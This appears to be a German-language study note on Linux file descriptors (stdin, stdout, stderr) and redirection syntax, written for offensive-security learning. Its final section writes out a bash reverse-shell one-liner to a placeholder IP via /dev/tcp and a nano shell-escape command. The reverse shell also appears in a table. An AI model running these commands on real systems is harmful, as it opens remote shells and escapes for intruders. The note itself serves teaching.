---
tags: [basics, linux]
aliases: [File Descriptors, Streams, Redirects, Datei-Deskriptoren]
---
# File Descriptors & Redirects

> Jeder Prozess hat drei Standard-Kanäle (Datei-Deskriptoren). Sie umzuleiten ist die Grundlage von Reverse-Shell-Payloads und Shell-Escapes.

## Die drei Kanäle
| Nr.   | Name   | Bedeutung                              | Default     |
| ----- | ------ | -------------------------------------- | ----------- |
| **0** | stdin  | Eingabe – was reinkommt                | Tastatur    |
| **1** | stdout | normale Ausgabe – das Ergebnis         | Bildschirm  |
| **2** | stderr | Fehlerausgabe – Fehler/Warnungen       | Bildschirm  |

## Umleiten (`>`)
`>` heißt „leite diesen Kanal woandershin". Die Zahl **davor** sagt, *welchen*:
- `1>` → stdout umleiten (= nur `>`, weil 1 der Default ist)
- `2>` → stderr umleiten
- `>&` → stdout **und** stderr zusammen
- `&1` / `&0` → „dorthin, wo Kanal 1 / 0 schon hinzeigt"

| Ausdruck | Bedeutung                                              |
| -------- | ------------------------------------------------------ |
| `2>&1`   | stderr dorthin, wo stdout hinzeigt                     |
| `>& /dev/tcp/<IP>/<PORT>` | stdout+stderr ins Netz (Reverse Shell)    |
| `0>&1`   | stdin aus derselben Quelle wie stdout (Netz)           |
| `1>&0 2>&0` | stdout+stderr aufs Terminal (stdin) zurück → interaktive Shell |

## In Angriffen
```bash
# Reverse Shell: alle drei Kanäle über die TCP-Verbindung
bash -i >& /dev/tcp/<IP>/4444 0>&1
```
```bash
# nano/GTFOBins Shell-Escape (alles aufs Terminal)
reset; sh 1>&0 2>&0
```
